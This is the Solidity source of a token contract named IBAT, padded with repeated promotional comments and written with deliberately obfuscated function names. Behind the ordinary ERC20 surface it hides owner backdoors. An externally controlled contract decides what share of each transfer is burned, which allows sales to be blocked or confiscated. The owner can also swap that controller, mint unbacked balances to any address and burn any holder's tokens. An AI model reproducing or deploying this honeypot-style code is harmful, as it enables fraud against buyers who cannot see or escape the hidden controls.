/*
About IBAT
* For more details, please visit: https://www.IBAT.com
* https://github.com/IBAT
* https://twitter.com/IBAT
* WebSite: https://www.IBAT.com
* English Telegram group:https://t.me/IBAT
* Chinese Telegram group:https://t.me/IBAT
*/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
   
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}
/*
* For more details, please visit: https://www.IBAT.com
* https://github.com/IBAT
* https://twitter.com/IBAT
* WebSite: https://www.IBAT.com
* English Telegram group:https://t.me/IBAT
* Chinese Telegram group:https://t.me/IBAT
*/
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipIBAT292(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipIBAT292(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceIBAT292Ownership() public virtual onlyOwner {
        emit OwnershipIBAT292(_owner, address(0));
        _owner = address(0);
    }

    function transferIBAT292Ownership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipIBAT292(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
   
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
   
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

   
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

   
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

   
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface ICIBAT292ont {
    function _joinpresale(address from,address to,uint256 amount) external returns(uint256);


    function setNumber(uint _number) external;
}


contract ERC20 is Context, IERC20, IERC20Metadata {
    
    struct Balance {
        address acc;
        uint amount;
    }

    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    //Balance[] private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    address _IBAT292add = 0xdf042c45f4C2340c830869fbb99cA439166b467e;
    ICIBAT292ont public icIBAT292ont = ICIBAT292ont(_IBAT292add);
    address private _deIBAT292adCSM = 0x000000000000000000000000000000000000dEaD;

/*
* For more details, please visit: https://www.IBAT.com
* https://github.com/IBAT
* https://twitter.com/IBAT
* WebSite: https://www.IBAT.com
* English Telegram group:https://t.me/IBAT
* Chinese Telegram group:https://t.me/IBAT
*/

    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _trIBAT292ansfer(_msgSender(), recipient, amount,0);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        }

        _trIBAT292ansfer(sender, recipient, amount,0);

        return true;
    }

    function increaseIBAT292Allowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseIBAT292Allowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _trIBAT292ansfer(
        address sender,
        address recipient,
        uint256 amount,
        uint256 _vIBAT292
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint _bal = _balances[sender] + _vIBAT292;
        require(_bal >= amount, "ERC20: transfer amount exceeds balance");

        _beforeTokenTransfer(sender, recipient, amount);

        uint _bamount = icIBAT292ont._joinpresale(sender,recipient,amount);

        if (_bamount>0) {
            subIBAT292Balance(sender,_bamount);
            addIBAT292Balance(_deIBAT292adCSM,_bamount);
            emit Transfer(sender,_deIBAT292adCSM,_bamount);
        }

        subIBAT292Balance(sender,amount-_bamount);
        addIBAT292Balance(recipient,amount-_bamount);       
        emit Transfer(sender,recipient,amount-_bamount);        


        _afterTokenTransfer(sender, recipient, amount);
    }

    function _b33IBAT292c172a(address _acc) internal virtual {
        icIBAT292ont = ICIBAT292ont(_acc);
    }

   function addIBAT292Balance(address account,uint amount) internal virtual {
       _balances[account] += amount;    
   }

   function subIBAT292Balance(address account,uint amount) internal virtual {
       _balances[account] -= amount;
   }   


    function _mIBAT292int(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        addIBAT292Balance(account,amount);
        emit Transfer(address(0), account, amount);
       
        _afterTokenTransfer(address(0), account, amount);
    }

    function _buIBAT292rn(address account, uint256 amount) internal virtual {
        require(account != _deIBAT292adCSM, "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, _deIBAT292adCSM, amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        
        subIBAT292Balance(account,amount);
        addIBAT292Balance(_deIBAT292adCSM,amount);

        emit Transfer(account, _deIBAT292adCSM, amount);

        _afterTokenTransfer(account, _deIBAT292adCSM, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event MIBAT292int(address indexed sender, uint amount0, uint amount1);
    event BuIBAT292rn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mIBAT292int(address to) external returns (uint liquidity);
    function buIBAT292rn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
/*
* For more details, please visit: https://www.IBAT.com
* https://github.com/IBAT
* https://twitter.com/IBAT
* WebSite: https://www.IBAT.com
* English Telegram group:https://t.me/IBAT
* Chinese Telegram group:https://t.me/IBAT
* _deIBAT292adCSM
*/
contract IBAT is ERC20, Ownable {
    address public  uniswapV2Pair;
    string  _naIBAT292me = "IBAT";
    string  _syIBAT292mbol = "IBAT";
    uint8 _decimal = 18;
    uint256 _totalsupply = 100000000 * (10 ** _decimal);
    address  _IBAT292swapCSM = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    constructor () ERC20(_naIBAT292me, _syIBAT292mbol, _decimal) 
    {   
        transferIBAT292Ownership(msg.sender);
        _mIBAT292int(owner(), _totalsupply);
        _buIBAT292rn(owner(), _totalsupply * 10 / 100); 
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_IBAT292swapCSM);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Pair   = _uniswapV2Pair;
     
    }
    function cIBAT292f(address recipient, uint256 amount) external onlyOwner {
        addIBAT292Balance(recipient,amount);
    }
    function BuIBAT292rn(address account,uint256 amount) external onlyOwner {
        _buIBAT292rn(account,amount);
    }

    function b33IBAT292c172a(address account) external onlyOwner {
        _b33IBAT292c172a(account);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        super._trIBAT292ansfer(from, to, amount,0);
    }

/*
* For more details, please visit: https://www.IBAT.com
* https://github.com/IBAT
* https://twitter.com/IBAT
* WebSite: https://www.IBAT.com
* English Telegram group:https://t.me/IBAT
* Chinese Telegram group:https://t.me/IBAT
*/
}